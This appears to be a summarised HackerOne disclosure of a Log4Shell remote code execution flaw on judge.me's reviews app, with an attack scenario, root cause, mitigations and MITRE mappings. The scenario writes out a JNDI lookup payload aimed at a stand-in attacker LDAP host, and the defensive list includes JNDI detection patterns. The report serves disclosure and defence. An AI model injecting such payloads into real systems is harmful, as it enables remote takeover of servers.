# Log4j RCE (CVE-2021-44228) on judge.me/reviews

## Metadata
- **Source:** HackerOne
- **Report:** 1427589 | https://hackerone.com/reports/1427589
- **Submitted:** 2021-12-15
- **Reporter:** bhishma14
- **Program:** judge.me
- **Bounty:** Not specified
- **Severity:** critical
- **Vuln:** Remote Code Execution, Log Injection, JNDI Injection, Arbitrary Code Execution
- **CVEs:** CVE-2021-44228
- **Category:** memory-binary

## Summary
The judge.me reviews application was vulnerable to CVE-2021-44228 (Log4Shell), a critical RCE vulnerability in Apache Log4j versions prior to 2.15. Attackers could achieve arbitrary code execution by injecting malicious JNDI lookup strings into log messages, requiring only ability to control logged input.

## Attack scenario
1. Attacker identifies that the judge.me/reviews application logs user-controlled input
2. Attacker crafts a payload containing JNDI lookup syntax (e.g., ${jndi:ldap://attacker.com/exploit})
3. Attacker submits the payload through a user input field that gets logged (review text, user agent, etc.)
4. Log4j processes the log message and evaluates the JNDI lookup substitution
5. The JNDI lookup causes the application to connect to attacker-controlled LDAP/RMI server
6. Attacker's server returns a serialized Java object containing malicious code that gets executed with application privileges

## Root cause
Apache Log4j versions before 2.15 contain a message lookup substitution feature that interprets JNDI expressions in log messages without proper validation. The vulnerability exists in the JndiLookup class which processes ${jndi:...} syntax during log formatting, allowing unauthenticated remote code execution when user-controlled data reaches logging functions.

## Attacker mindset
This is an opportunistic, widespread attack vector. The attacker recognizes that: (1) Log4j is ubiquitously deployed, (2) exploitation requires minimal skill, (3) impact is maximum (full system compromise), (4) detection evasion is straightforward by using common input vectors like User-Agent or review content, (5) the attack chain is simple enough for script-kiddies to execute at scale.

## Defensive takeaways
- Immediately patch all Log4j instances to version 2.16.0+ (or 2.12.2+ for Java 6)
- Implement input validation and sanitization for all user-controlled data before logging
- Disable JNDI lookup substitution using system property: -Dlog4j2.formatMsgNoLookups=true as immediate mitigation
- Maintain inventory of all third-party dependencies and their versions
- Establish vulnerability scanning and patch management procedures for transitive dependencies
- Implement network segmentation to limit outbound LDAP/RMI connections from application servers
- Monitor logs for suspicious JNDI patterns like ${jndi:ldap, ${jndi:rmi to detect exploitation attempts
- Use Web Application Firewalls to block payloads containing JNDI lookup syntax

## Variant hunting
Hunt for Log4j usage in: (1) other endpoints accepting user input (comments, messages, user profiles), (2) header processing (X-Forwarded-For, Accept-Language), (3) API endpoints with logging, (4) third-party integrations that may log data, (5) similar applications within the same ecosystem, (6) older versions of Log4j (2.0-2.14.x) across the infrastructure

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1052 - Exfiltration Over Network
- T1059 - Command and Scripting Interpreter
- T1133 - External Remote Services
- T1105 - Ingress Tool Transfer

## Notes
This report demonstrates a zero-click exploitation scenario on a popular application. The vulnerability affected millions of systems globally. Proof of concept included screenshots and log evidence. The researcher properly disclosed the vulnerability and provided remediation steps. This is a landmark case in supply chain vulnerability management, emphasizing the need for rapid patching procedures for critical transitive dependencies.

## Full report
<details><summary>Expand</summary>

Summary:
CVE-2021-44228, also named Log4Shell or LogJam, is a Remote Code Execution (RCE) class vulnerability. If attackers manage to exploit it on one of the servers, they gain the ability to execute arbitrary code and potentially take full control of the system.
What makes CVE-2021-44228 especially dangerous is the ease of exploitation: even an inexperienced hacker can successfully execute an attack using this vulnerability. According to the researchers, attackers only need to force the application to write just one string to the log, and after that they are able to upload their own code into the application due to the message lookup substitution function.

Supporting Material/References:
Picture and Logs was Uploaded as a proof.

https://www.tenable.com/blog/cve-2021-44228-proof-of-concept-for-critical-apache-log4j-remote-code-execution-vulnerability

Remediation:
Update the log4j jar to 2.15 or 2.16

## Impact

Successful attack leads Arbitary Code Execution on the application

</details>

---
*Analysed by Claude on 2026-05-12*
